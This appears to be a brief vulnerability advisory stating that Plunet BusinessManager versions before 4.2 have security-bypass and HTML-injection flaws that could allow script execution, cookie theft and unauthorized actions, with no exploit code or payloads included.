Plunet BusinessManager is prone to multiple security-bypass and HTML-injection vulnerabilities because it fails to properly sanitize user-supplied input.

An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site, steal cookie-based authentication credentials, control how the site is rendered to the user, or perform unauthorized actions as another user; other attacks may also be possible.

Versions prior to BusinessManager 4.2 are vulnerable.
